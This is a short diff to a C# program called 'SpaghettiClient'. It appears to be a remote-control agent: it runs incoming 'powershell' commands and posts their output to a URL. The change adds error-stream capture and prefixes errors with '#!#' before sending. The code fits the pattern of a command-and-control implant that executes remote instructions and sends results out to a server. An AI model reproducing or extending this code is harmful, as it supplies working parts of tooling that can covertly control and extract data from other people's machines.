@@ -44,7 +44,9 @@ namespace SpaghettiClient
                 }
                 else if (cmd.ToLower().StartsWith("powershell "))
                 {
-                    string output = commands.RunPSH(cmd, location);
+                    (string output, string error) = commands.RunPSH(cmd, location);
+                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;
+
                     Utilities.Post(url, output.ToString());
                 }
                 else
